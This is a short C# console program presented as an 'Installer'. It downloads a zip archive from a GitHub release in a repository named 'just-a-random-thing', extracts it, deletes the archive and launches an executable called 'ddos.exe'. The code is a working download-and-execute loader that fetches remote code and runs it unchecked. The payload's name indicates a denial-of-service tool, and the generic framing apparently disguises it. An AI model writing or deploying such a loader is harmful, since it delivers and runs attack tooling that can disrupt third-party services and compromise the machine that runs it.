using System;
using System.Net;
using System.IO.Compression;
using System.IO;
using System.Threading;
using System.Diagnostics;


namespace Installer
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Installer";
            string web = "https://github.com/vilwedn/just-a-random-thing/releases/download/0.1/build.zip";
            string file = @"build.zip";
            string directory = @"app";            
            string start = @"app\ddos.exe";
            Console.WriteLine("PROCESS INITIATED");
            Console.WriteLine("DOWNLOADING");
            using (WebClient web1 = new WebClient())                        
            web1.DownloadFile(web, file);
            Thread.Sleep(2000);
            Console.WriteLine("EXTRACTING");
            ZipFile.ExtractToDirectory(file, directory);
            Console.WriteLine("DELETING");
            File.Delete(file);
            Process.Start(start);
            Console.WriteLine("DONE");
            Console.ReadKey();
        }

    }
}

